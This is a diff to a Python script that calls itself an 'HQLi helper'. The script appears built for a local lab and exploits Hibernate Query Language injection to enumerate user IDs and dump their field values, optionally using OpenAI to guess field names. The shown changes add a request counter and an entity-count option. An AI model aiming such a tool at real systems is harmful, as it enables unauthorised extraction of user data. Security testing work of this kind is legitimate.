@@ -9,9 +9,10 @@ URL = "http://localhost:8443/checkvalidagent"  # GET endpoint that accepts ?agen
 VERIFY_TLS = False
 PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # set None to disable
 HEADERS = {}  # extra headers if needed
+REQUESTS_SENT = 0
 
 # Phase 1: userId discovery
-TARGET_USER_COUNT = 2
+TARGET_ENTITY_COUNT = 2
 USERID_MAXLEN = 8
 USERID_CHARSET = "0123456789"  # observed
 
@@ -191,6 +192,8 @@ def do_request(agent: str):
     params = {"agentCode": agent}
     r = requests.get(URL, params=params, headers=HEADERS,
                      timeout=20, verify=VERIFY_TLS, proxies=PROXY)
+    global REQUESTS_SENT
+    REQUESTS_SENT += 1
     try:
         j = r.json()
     except Exception:
@@ -321,6 +324,7 @@ def discover_and_dump_fields(user_ids: list[str]):
                 print(f"[result] {uid} :: {field} = {repr(value)}")
                 results.append((uid, field, value))
     print("\n=== OVERALL RESULTS ===")
+    print(f"Total requests sent: {REQUESTS_SENT}")
     for uid, field, value in results:
         print(f"{uid} :: {field} = {repr(value)}")
     return results
@@ -329,18 +333,20 @@ def discover_and_dump_fields(user_ids: list[str]):
 # Main
 # =======================
 def main():
-    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT
+    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT
     parser = argparse.ArgumentParser(description="HQLi helper")
     parser.add_argument("--debug", action="store_true", help="Enable verbose request logging")
     parser.add_argument("--entity", required=True, help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
     parser.add_argument("--ai-mode", action="store_true", help="Use OpenAI to suggest extra fields (requires OPENAI_API_KEY)")
     parser.add_argument("--fields", required=True, help="Path to a wordlist file of field names to try (one per line)")
     parser.add_argument("--ai-field-count", type=int, default=10, help="How many fields to fetch from OpenAI when --ai-mode is enabled (default: 10)")
+    parser.add_argument("--entity-count", type=int, default=2, help="Total number of entities to enumerate (default: 2)")
     args = parser.parse_args()
     DEBUG = args.debug
     HQL_ENTITY = args.entity
     AI_MODE = args.ai_mode
     AI_FIELD_COUNT = max(1, min(int(args.ai_field_count or 10), 50))
+    TARGET_ENTITY_COUNT = max(1, int(args.entity_count or 2))
 
     if args.fields:
         augment_fields_from_file(args.fields)
@@ -349,7 +355,7 @@ def main():
         augment_fields_from_ai(HQL_ENTITY, AI_FIELD_COUNT)
 
     oracle_ok()
-    user_ids = enumerate_userids(TARGET_USER_COUNT)
+    user_ids = enumerate_userids(TARGET_ENTITY_COUNT)
     if not user_ids:
         pass
     if user_ids:
